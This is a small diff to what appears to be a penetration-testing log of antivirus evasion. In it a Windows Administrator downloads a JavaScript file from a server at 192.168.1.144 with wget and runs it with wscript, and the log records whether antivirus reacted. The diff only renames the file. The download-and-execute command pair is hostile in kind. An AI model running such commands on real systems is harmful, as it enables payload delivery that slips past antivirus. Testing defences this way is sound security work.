@@ -207,7 +207,7 @@ c:\temp> exit
 Test of the JS script => No AV detection during the download but an AV warning message was displayed during the execution
 =========================================================================================================================
 
-PS C:\Users\Administrator> wget -uri http://192.168.1.144:8080/JS-superscript.txt -OutFile C:\temp\JS-script.txt
+PS C:\Users\Administrator> wget -uri http://192.168.1.144:8080/JS-script.txt -OutFile C:\temp\JS-script.txt
 
 PS C:\Users\Administrator> cmd
 Microsoft Windows [Version 10.0.20348.3692]
@@ -215,7 +215,7 @@ Microsoft Windows [Version 10.0.20348.3692]
 
 C:\Users\Administrator>cd C:\temp
 
-C:\temp>wscript //E:javascript .\JS-superscript.txt
+C:\temp>wscript //E:javascript .\JS-script.txt
 
 C:\temp>
 
